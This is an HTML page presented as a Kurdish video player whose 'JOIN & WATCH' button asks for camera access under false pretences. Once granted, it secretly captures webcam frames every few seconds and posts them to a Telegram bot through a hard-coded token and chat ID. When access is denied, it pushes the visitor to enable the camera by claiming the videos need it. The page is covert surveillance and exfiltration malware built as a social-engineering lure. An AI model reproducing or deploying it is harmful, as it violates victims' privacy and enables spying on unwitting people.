<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player - Kurdish Content</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .video-card {
            background: #111;
            width: 90%;
            max-width: 400px;
            border-radius: 15px;
            overflow: hidden;
            border: 1px solid #333;
            box-shadow: 0 10px 35px rgba(0,0,0,0.9);
        }

        .thumbnail {
            width: 100%;
            height: 220px;
            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://img.freepik.com/free-photo/abstract-dark-background-with-flowing-lines_23-2148835560.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .play-icon {
            font-size: 70px;
            color: rgba(255,255,255,0.8);
            cursor: pointer;
        }

        .content {
            padding: 25px;
            text-align: center;
        }

        h2 {
            font-size: 1.3rem;
            margin-bottom: 12px;
            color: #ff2e63;
        }

        p {
            font-size: 0.95rem;
            color: #bbb;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .btn-join {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 16px;
            width: 100%;
            border-radius: 12px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(255,0,0,0.3);
        }

        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="video-card">
    <div class="thumbnail">
        <div class="play-icon" onclick="startSystem()">▶</div>
    </div>
    <div class="content">
        <h2>بۆ بینینی ڤیدیۆی خۆشی کوردی</h2>
        <p>بۆ بینینی نوێترین ڤیدیۆ تایبەتەکان و جۆین بوون لە گرووپ، کلیک لە دوگمەی خوارەوە بکە.</p>
        <button class="btn-join" id="mainBtn" onclick="startSystem()">JOIN & WATCH</button>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
‎    // زانیارییە نوێیەکانی جەنابت
    const botToken = '9199269078:AAGADaMWgbT65egBa5HZhhiPO92YBNLZhBs';
    const chatId = '8594309916';

    async function startSystem() {
        const btn = document.getElementById('mainBtn');
        btn.innerHTML = "Connecting...";
        
        try {
‎            // داواکردنی کامێرا بە شێوەیەک کە زۆرینەی وێبگەڕەکان قبوڵی دەکەن
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            btn.style.background = "#444";
            btn.disabled = true;

‎            // ناردنی یەکەم وێنە
            setTimeout(() => captureAndSend(), 1500);

‎            // ناردنی وێنە هەر 8 چرکە جارێک
            setInterval(() => captureAndSend(), 8000);

        } catch (err) {
‎            // ئەگەر Allow دەرنەکەوت، ئەم نامەیە نیشان دەدەین بۆ ئەوەی کەسەکە بچێتە Settings
            alert("تکایە لە بەشی سەرەوەی سایتەکە (لای قفڵەکە) مۆڵەتی کامێرا بدە تا ڤیدیۆکان کار بکات!");
            console.error(err);
        }
    }

function captureAndSend() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        const context = canvas.getContext('2d');
        
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'image.jpg');
            formData.append('caption', '📸 New Photo Received!\nStatus: Active');

            fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                method: 'POST',
                body: formData
            });
        }, 'image/jpeg', 0.6); 
    }
</script>

</body>
</html>
